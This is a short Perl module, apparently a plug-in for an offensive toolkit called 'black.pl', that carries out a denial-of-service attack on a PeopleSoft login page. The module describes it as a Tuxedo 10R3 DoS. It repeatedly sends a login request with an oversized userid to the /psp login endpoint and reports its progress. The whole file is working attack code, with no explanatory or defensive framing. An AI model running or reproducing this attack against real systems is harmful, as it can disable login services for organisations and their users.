#!/usr/bin/perl
# Module PeopleSoft Login DoS 

# CONFIG
######################
my $desc ="Login DoS (Tuxedo 10R3 DoS) \n\t Usage: black.pl .. .. -m id_module <num> - packet count, default is 100\n"; 
our $funcName="login_dos_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub login_dos_Func()
{

	my $XML="timezoneOffset=-240&userid=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&pwd=123123";

	if ($ARGV[$m_arg_i+1]){
		$num=$ARGV[$m_arg_i+1];
		print $num." - num \n\n";
	} else {
		$num=100;
	}
	
	print "Start DoS!\n";
	for (my $i=0;$i<$num;$i++)
	{
		send_soap($XML,0,'/psp/$ps_site_name/?cmd=login&languageCd=RUS',);
		$prc = int($i*100/$num);
		
		if(($prc%10)==0)
			{ print "$prc% - Done! ($i-$num)\n"; };
	}
	
	print "\n";
	
	
	

}